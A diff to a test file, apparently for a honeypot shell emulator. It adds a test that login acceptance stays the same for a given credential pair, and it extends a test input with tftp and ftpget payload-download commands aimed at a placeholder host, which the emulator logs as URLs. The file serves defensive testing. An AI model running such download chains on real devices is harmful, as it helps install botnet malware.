@@ -226,6 +226,21 @@ test.case("login: accept_chance 1.0 lets the first attempt in") do
   test.assert(shell.line(sh, "p").events[0].ok)
 end
 
+test.case("login: a pair gets the same answer in every session") do
+  let ok = fn(user, password)
+    let sh = shell.new({accept_on: 100, accept_chance: 0.25})
+    shell.line(sh, user)
+    shell.line(sh, password).events[0].ok
+  end
+  let accepted = 0
+  for k = 0, 2000
+    let first = ok("root", "pw{k}")
+    test.assert_eq(ok("root", "pw{k}"), first, "pw{k}")
+    if first then accepted += 1 end
+  end
+  test.assert(accepted > 400 and accepted < 600, "{accepted}")
+end
+
 test.case("parse: words, quotes and operators") do
   let cmds = shell.parse("echo 'a;b' \"c\\\"d\" e\\ f; x && y || z | w & v # comment")
   test.assert_eq(table.map(cmds, fn(c) c.words end), [["echo", "a;b", "c\"d", "e f"], ["x"], ["y"], ["z"], ["w"], ["v"]])
@@ -365,7 +380,7 @@ test.case("shell: groups run in a subshell") do
   # wget's progress goes to stderr, which `> w` leaves alone.
   test.assert(string.starts_with(r.out, "Connecting to 9.8.7.6 (9.8.7.6:80)\nwriting to stdout\n"))
   test.assert(not string.contains(r.out, "not found"))
-  r = shell.line(sh, "(tftp -g 9.8.7.6 -r tftp -l- || busybox tftp -g 9.8.7.6 -r tftp -l-) > t; (ftpget 9.8.7.6 f ftpget) > f")
+  r = shell.line(sh, "(tftp -g 9.8.7.6 -r tftp -l- || busybox tftp -g 9.8.7.6 -r tftp -l-) > t; (ftpget 9.8.7.6 f ftpget || busybox ftpget 9.8.7.6 f ftpget) > f")
   test.assert_eq(table.map(table.filter(r.events, fn(e) e.kind == "url" end), fn(e) e.url end), [
     "tftp://9.8.7.6/tftp", "ftp://9.8.7.6/ftpget"
   ])
